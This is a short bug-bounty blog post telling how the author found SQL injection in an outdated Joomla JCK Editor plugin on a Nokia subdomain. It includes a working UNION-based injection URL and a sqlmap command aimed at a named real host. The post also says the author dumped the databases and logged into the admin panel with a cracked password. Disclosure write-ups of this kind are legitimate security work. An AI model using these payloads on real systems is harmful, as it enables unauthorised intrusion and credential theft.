---
title: "SQL Injection on Nokia subdomain"
date: 2019-11-04T17:55:28+08:00
description: "this blog is about SQL Injection on nokia subdomain"
tags: ["bugbounty","security","webpentesting"]
type: post
weight: 25
showTableOfContents: true
---

Hello :wave:, I'll share with you how I found sqli on Nokia that makes me able to login into the admin page
you will not see something new here like new techniques or something, just simple steps

after doing subdomain enumeration I found a subdomain that's working with Joomla, after that I ran joomscan to get the version of the cms and plugins to see if there's any outdated version to exploit it, and joomscan gives me an old plugin called `JCK Editor` with version `6.4.4`
and after searching with this version on exploit-DB i found SQLI injection in this version [CVE-2018-17254](https://www.exploit-db.com/exploits/45423)

```
Test = [HOST]/[PATH]/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=%22%20UNION%20SELECT%20NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL--%20aa
```

![sql_nokia](https://1.bp.blogspot.com/-LgYxMfeJKhs/Xscwx2tKONI/AAAAAAAAEMs/HJ5I5jgXFv8ExESVK3bm0Mk2hpQWbDiagCK4BGAsYHg/nokiasql.png)

as you can see, we can get the version of the database :mag:

this time for my fav weapon (SQLMAP)


```bash
$ sqlmap -u 'https://gdclive.nokia.com/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=' --level=5 --risk=3 --random-agent --technique=U -p parent --batch --current-DB --current-user
```



you can see the current user and the name of the database :)

After dumping all databases using the --all option and unencrypt the password of the admin account let's login in admin panel

![nokia_pwn](https://1.bp.blogspot.com/-87ctqF3EmDM/XscxFpvVAhI/AAAAAAAAENE/Cgi-Kfnjxco0cND_FONrVmsOWySdiu_SQCK4BGAsYHg/cp.jpg)


see ya :v:
